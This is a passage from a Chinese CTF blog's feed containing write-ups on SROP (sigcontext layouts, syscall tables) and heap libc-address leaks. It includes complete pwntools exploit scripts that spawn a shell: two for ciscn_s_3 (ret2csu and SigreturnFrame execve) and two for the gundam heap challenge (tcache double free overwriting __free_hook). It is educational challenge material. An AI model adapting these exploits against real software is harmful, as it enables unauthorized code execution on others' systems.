class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> short gs, __gsh;</span><br><span class="line"><span class="keyword">unsigned</span> short fs, __fsh;</span><br><span class="line"><span class="keyword">unsigned</span> short es, __esh;</span><br><span class="line"><span class="keyword">unsigned</span> short ds, __dsh;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> edi;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> esi;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> ebp;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> esp;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> ebx;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> edx;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> ecx;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> eax;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> trapno;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> err;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> eip;</span><br><span class="line"><span class="keyword">unsigned</span> short cs, __csh;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> esp_at_signal;</span><br><span class="line"><span class="keyword">unsigned</span> short ss, __ssh;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> oldmask;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> cr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在64位lunix 下sigcontext 的结构为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></span><br><span class="line">      <span class="keyword">__uint16_t</span>        cwd;</span><br><span class="line">      <span class="keyword">__uint16_t</span>        swd;</span><br><span class="line">      <span class="keyword">__uint16_t</span>        ftw;</span><br><span class="line">      <span class="keyword">__uint16_t</span>        fop;</span><br><span class="line">      <span class="keyword">__uint64_t</span>        rip;</span><br><span class="line">      <span class="keyword">__uint64_t</span>        rdp;</span><br><span class="line">      <span class="keyword">__uint32_t</span>        mxcsr;</span><br><span class="line">      <span class="keyword">__uint32_t</span>        mxcr_mask;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpxreg</span>    _<span class="title">st</span>[8];</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">xmmreg</span>    _<span class="title">xmm</span>[16];</span></span><br><span class="line">      <span class="keyword">__uint32_t</span>        padding[<span class="number">24</span>];</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="keyword">__uint64_t</span> r8;</span><br><span class="line">      <span class="keyword">__uint64_t</span> r9;</span><br><span class="line">      <span class="keyword">__uint64_t</span> r10;</span><br><span class="line">      <span class="keyword">__uint64_t</span> r11;</span><br><span class="line">      <span class="keyword">__uint64_t</span> r12;</span><br><span class="line">      <span class="keyword">__uint64_t</span> r13;</span><br><span class="line">      <span class="keyword">__uint64_t</span> r14;</span><br><span class="line">      <span class="keyword">__uint64_t</span> r15;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rdi;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rsi;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rbp;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rbx;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rdx;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rax;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rcx;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rsp;</span><br><span class="line">      <span class="keyword">__uint64_t</span> rip;</span><br><span class="line">      <span class="keyword">__uint64_t</span> eflags;</span><br><span class="line">      <span class="keyword">unsigned</span> short cs;</span><br><span class="line">      <span class="keyword">unsigned</span> short gs;</span><br><span class="line">      <span class="keyword">unsigned</span> short fs;</span><br><span class="line">      <span class="keyword">unsigned</span> short __pad0;</span><br><span class="line">      <span class="keyword">__uint64_t</span> err;</span><br><span class="line">      <span class="keyword">__uint64_t</span> trapno;</span><br><span class="line">      <span class="keyword">__uint64_t</span> oldmask;</span><br><span class="line">      <span class="keyword">__uint64_t</span> cr2;</span><br><span class="line">      __extension__ <span class="keyword">union</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">          <span class="keyword">__uint64_t</span> __fpstate_word;</span><br><span class="line">        &#125;;</span><br><span class="line">      <span class="keyword">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><p>用图片来形容X64的sigcontext 的结构应该如下表示:</p><p><img src="image-20210521095910046.png" alt="image-20210521095910046"></p><h3 id="SROP-原理"><a href="#SROP-原理" class="headerlink" title="SROP 原理"></a>SROP 原理</h3><p>在程序某一个地方伪造一个<code>signal Frame</code>,再让程序<code>sys_rt_sigreturn</code>我们构造的fake signal Frame.让进程恢复到我们构造的恶意状态.</p><p><img src="image-20210521101741135.png" alt="image-20210521101741135"></p><h2 id="常用系统调用号"><a href="#常用系统调用号" class="headerlink" title="常用系统调用号"></a>常用系统调用号</h2><h3 id="i386"><a href="#i386" class="headerlink" title="i386"></a>i386</h3><table><thead><tr><th>NR</th><th>syscall name</th><th>%eax</th><th>arg0 (%ebx)</th><th>arg1 (%ecx)</th><th>arg2 (%edx)</th></tr></thead><tbody><tr><td>3</td><td>read</td><td>0x03</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td></tr><tr><td>4</td><td>write</td><td>0x04</td><td>unsigned int fd</td><td>const char *buf</td><td>size_t count</td></tr><tr><td>5</td><td>open</td><td>0x05</td><td>const char *filename</td><td>int flags</td><td>umode_t mode</td></tr><tr><td>11</td><td>execve</td><td>0x0b</td><td>const char *filename</td><td>char *const *argv</td><td>char *const *envp</td></tr><tr><td>173</td><td>rt_sigreturn</td><td>0xad</td><td>?</td><td>?</td><td>?</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;int execve(const char *pathname, char *const argv[],char *const envp[]);</span><br><span class="line">173i386rt_sigreturnsys_rt_sigreturnstub32_rt_sigreturn</span><br><span class="line">&#x2F;&#x2F; mov  eax 0xad</span><br><span class="line">&#x2F;&#x2F;syscall</span><br><span class="line">&#x2F;&#x2F;retn   Signal Frame addr</span><br></pre></td></tr></table></figure><h3 id="amd64"><a href="#amd64" class="headerlink" title="amd64"></a>amd64</h3><table><thead><tr><th>NR</th><th align="center">syscall name</th><th>%rax</th><th>arg0 (%rdi)</th><th>arg1 (%rsi)</th><th>arg2 (%rdx)</th></tr></thead><tbody><tr><td>0</td><td align="center">read</td><td>0x00</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td></tr><tr><td>1</td><td align="center">write</td><td>0x01</td><td>unsigned int fd</td><td>const char *buf</td><td></td></tr><tr><td>2</td><td align="center">open</td><td>0x02</td><td>const char *filename</td><td>int flags</td><td>umode_t mode</td></tr><tr><td>3</td><td align="center">rt_sigreturn</td><td>0x0f</td><td>?</td><td>?</td><td>?</td></tr><tr><td>59</td><td align="center">execve</td><td>0x3b</td><td>const char *filename</td><td>char *const *argv</td><td>char *const *envp</td></tr></tbody></table><h2 id="例题ciscn-s-3"><a href="#例题ciscn-s-3" class="headerlink" title="例题ciscn_s_3"></a>例题ciscn_s_3</h2><p><img src="image-20210521114438090.png" alt="image-20210521114438090"></p><p>这个题目很奇怪,我ida无法F5,然后自己手撕汇编.</p><p><img src="image-20210521115053077.png" alt="image-20210521115053077"></p><p>程序只调用的系统调用而没有调用libc函数.在程序运行的流程中调用系统调用来读入数据到buf,但buf数据只有0x10大小，所以存在栈溢出。然后，接下来调用系统调用来显示数据，但同样存在输出数据范围大于buf于是存在信息泄露。</p><h3 id="解法1-execve与libc-csu-init"><a href="#解法1-execve与libc-csu-init" class="headerlink" title="解法1:execve与libc_csu_init"></a>解法1:execve与libc_csu_init</h3><p>用利用题目中<code>mov     rax, 3Bh;ret</code>gatget来修改rax为0x3b，同时利用libc_csu_init来修改rdx为0，用<code>pop rdi;ret</code>来修改rdi 的值指向<code>/bin/sh</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line">context.arch = e.arch</span><br><span class="line">p=process(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">'/bin/sh\x00'</span>+<span class="string">'a'</span>*(<span class="number">0x10</span>-len(<span class="string">'/bin/sh\x00'</span>))+p64(<span class="number">0x0000000004004F1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sgdb.attach(p)</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">add=p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">print(hex(u64(add)<span class="number">-0x110</span>))</span><br><span class="line">stack=u64(add)<span class="number">-0x110</span></span><br><span class="line">log.info(<span class="string">'stack:'</span>+hex(stack))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">rax=<span class="number">0x0000000004004E2</span>  <span class="comment">#mov     rax, 3Bh;ret</span></span><br><span class="line">libc_csu_init_gat1=<span class="number">0x00000000040059A</span></span><br><span class="line">libc_csu_init_gat2=<span class="number">0x000000000400580</span></span><br><span class="line">rdi_ret=<span class="number">0x00000000004005a3</span><span class="comment"># pop rdi;ret</span></span><br><span class="line">syscall_ret=<span class="number">0x0000000000400517</span><span class="comment"># syscall ; ret</span></span><br><span class="line"></span><br><span class="line">pay=<span class="string">'/bin/sh\x00'</span>+<span class="string">'a'</span>*(<span class="number">0x10</span>-len(<span class="string">'/bin/sh\x00'</span>))+p64(rax)+p64(libc_csu_init_gat1)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(stack+<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(libc_csu_init_gat2)+<span class="string">'a'</span>*<span class="number">0x38</span>+p64(rdi_ret)+p64(stack)+p64(syscall_ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="解法2：srop"><a href="#解法2：srop" class="headerlink" title="解法2：srop"></a>解法2：srop</h3><p>同样我们可以利用srop，在栈中部署一个伪造signal Frame sigcontext，然后用rt_sigreturn来恶意恢复重而get shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line">context.arch = e.arch</span><br><span class="line"><span class="comment">#p=remote('node3.buuoj.cn',27681)</span></span><br><span class="line">p=process(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line">vuln=<span class="number">0x0000000004004F1</span> <span class="comment">#</span></span><br><span class="line">pay=<span class="string">'/bin/sh\x00'</span>+<span class="string">'a'</span>*(<span class="number">0x10</span>-len(<span class="string">'/bin/sh\x00'</span>))+p64(<span class="number">0x0000000004004F1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sgdb.attach(p)</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">add=p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">print(hex(u64(add)<span class="number">-0x110</span>))</span><br><span class="line">stack=u64(add)<span class="number">-0x110</span></span><br><span class="line">log.info(<span class="string">'stack:'</span>+hex(stack))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">syscall_ret=<span class="number">0x0000000000400517</span><span class="comment"># syscall ; ret</span></span><br><span class="line">rax=<span class="number">0x0000000004004DA</span>  <span class="comment">#mov     rax, 0Fh;ret</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = stack</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall_ret</span><br><span class="line">pay=<span class="string">'/bin/sh\x00'</span>+<span class="string">'a'</span>*(<span class="number">0x10</span>-len(<span class="string">'/bin/sh\x00'</span>))+p64(rax)+p64(syscall_ret)+str(frame)</span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md" target="_blank" rel="noopener">系统调用号</a></p><p><a href="https://ctf-wiki.org/pwn/linux/stackoverflow/advanced-rop/srop/" target="_blank" rel="noopener">https://ctf-wiki.org/pwn/linux/stackoverflow/advanced-rop/srop/</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近在刷题时,遇到很多关于没有或很少调用libc函数但使用了系统调用的题目,这些题目常常可以利用SROP的方法来解决，因此写个笔记来总结归纳下SROP利用原理与过程.</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn堆题泄露libc真实地址小tirck</title>
    <link href="lexsd6.github.io/2021/05/02/heap%E6%B3%84%E9%9C%B2%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80tirck/"/>
    <id>lexsd6.github.io/2021/05/02/heap%E6%B3%84%E9%9C%B2%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80tirck/</id>
    <published>2021-05-02T10:50:25.221Z</published>
    <updated>2021-05-04T03:42:08.473Z</updated>
    
    <content type="html"><![CDATA[<p>在做pwn时,一直烦扰我的是本地打通了,远程打不通的情况。这情况在做堆题时印象最为深刻，因为在做堆题我们往往只能从附件或提示中得到题目环境的libc的大版本，导致我们在计算偏移时会与远程存在差异。因此本文从本地泄露地址讲起，如何避免偏移libc版本地址偏移差异导致功亏一篑。<a id="more"></a></p><h2 id="本地地址泄露方法"><a href="#本地地址泄露方法" class="headerlink" title="本地地址泄露方法"></a>本地地址泄露方法</h2><p>我们以2018-HitCon-Pwn-gundam来分析下，题目保护如下：</p><p><img src="image-20210503234633625.png" alt="image-20210503234633625"></p><blockquote><p>由于linux中使用<code>free()</code>进行内存释放时，不大于 <code>max_fast</code> （默认值为 64B）的 chunk 被释放后，首先会被放到 <code>fast bins</code>中，大于<code>max_fast</code>的chunk或者<code>fast bins</code> 中的空闲 chunk 合并后会被放入<code>unsorted bin</code>中。而在fastbin为空时，<code>unsortbin</code>的fd和bk指向自身<code>main_arena</code>中，该地址的相对偏移值存放在libc.so中，可以通过use after free后打印出<code>main_arena</code>的实际地址，结合偏移值从而得到libc的加载地址。</p></blockquote><p>所以我们在做堆题时，通常都是我们想办法构造出一个大于0x90的chunk来free掉加入unsorted bin，获得一个在<code>main_arena</code>相近的值从而得到<code>main_arena</code>的真实地址。再通过gdb  vmmap 得到libc的基地址.</p><p><img src="image-20210503232104347.png" alt="image-20210503232104347"></p><p>再继续通过gdb寻找<code>__free_hook</code>、<code>__malloc__hook</code>、<code>system</code>这些敏感symbols的地址，计算出他们与libc基地址偏移。</p><p><img src="image-20210503232436354.png" alt="image-20210503232436354"></p><p>这样在同一个环境中，就算开了保护 libc.so 动态链接库中的symbols与libc 基地址相对偏移是固定的。我们得到了unsorted bin就可以得到所有我们想要的地址。</p><p><img src="image-20210503234159126.png" alt="image-20210503234159126"></p><p>这样方法写出的exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote('challenge-6759487098ea2b0b.sandbox.ctfhub.com',23648)</span></span><br><span class="line">p=process(<span class="string">'./gundam'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"gundam :"</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">"gundam :"</span>,<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Destory:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blow_up</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">free(i)</span><br><span class="line">blow_up()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">0x4</span>)</span><br><span class="line">build(<span class="string">'B'</span>*<span class="number">7</span>)</span><br><span class="line">blow_up()</span><br><span class="line">visit()</span><br><span class="line">addr = (p.recvuntil(<span class="string">"Type[7]"</span>,drop=<span class="literal">True</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">print(addr)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">print(hex(u64(addr)))</span><br><span class="line">base=u64(addr)<span class="number">-0x3afca0</span></span><br><span class="line">print(hex(base))</span><br><span class="line">free_hook=base+<span class="number">0x3b18e8</span></span><br><span class="line">print(<span class="string">'4'</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">blow_up()</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">build(p64(free_hook))</span><br><span class="line"></span><br><span class="line">build(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">build(p64(base+<span class="number">0x41780</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="减少gdb调试依赖"><a href="#减少gdb调试依赖" class="headerlink" title="减少gdb调试依赖"></a>减少gdb调试依赖</h2><p>但我们这样做有缺陷，我们所有的地址都是通过本地gdb一个一个gdb出来。所有偏移的计算过程，都有本地gdb参与。然不同的libc下，各symbols的偏移是不同。而远程下我们是不能进行gdb调的。但我们发现，libc与<code>__free_hook</code>、<code>__malloc__hook</code>、<code>system</code>这些敏感symbols的地址的偏移差距不仅固定，而且就是symbols在so文件中地址的差异。</p><p><img src="image-20210504002319132.png" alt="image-20210504002319132"></p><p>这样利用pwntool 中的<code>symbols</code>来获得偏移，从而减少了对gdb调试的依赖。同时，又通过附件中的libc得到了远程环境的相同的偏移。</p><p>这样写法的完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote('challenge-6759487098ea2b0b.sandbox.ctfhub.com',23648)</span></span><br><span class="line">p=process(<span class="string">'./gundam'</span>)</span><br><span class="line">l=ELF(<span class="string">'/glibc/2.27/amd64/lib/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"gundam :"</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">"gundam :"</span>,<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Destory:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blow_up</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"choice : "</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">free(i)</span><br><span class="line">blow_up()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">build(<span class="string">'a'</span>*<span class="number">0x4</span>)</span><br><span class="line">build(<span class="string">'B'</span>*<span class="number">7</span>)</span><br><span class="line">blow_up()</span><br><span class="line">visit()</span><br><span class="line">addr = (p.recvuntil(<span class="string">"Type[7]"</span>,drop=<span class="literal">True</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">print(addr)</span><br><span class="line"></span><br><span class="line">print(hex(u64(addr)))</span><br><span class="line">main_arena=u64(addr)<span class="number">-96</span></span><br><span class="line">log.info(<span class="string">'main_arene:'</span>+hex(main_arena))</span><br><span class="line">base=main_arena<span class="number">-0x3afc40</span></span><br><span class="line">log.info(<span class="string">'libc_base:'</span>+hex(base))</span><br><span class="line">free_hook=base+l.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">log.info(<span class="string">'free_hook:'</span>+hex(free_hook))</span><br><span class="line">system_addr=base+l.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.info(<span class="string">'system:'</span>+hex(system_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">print(<span class="string">'4'</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">blow_up()</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">build(p64(free_hook))</span><br><span class="line"></span><br><span class="line">build(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">build(p64(system_addr))</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span 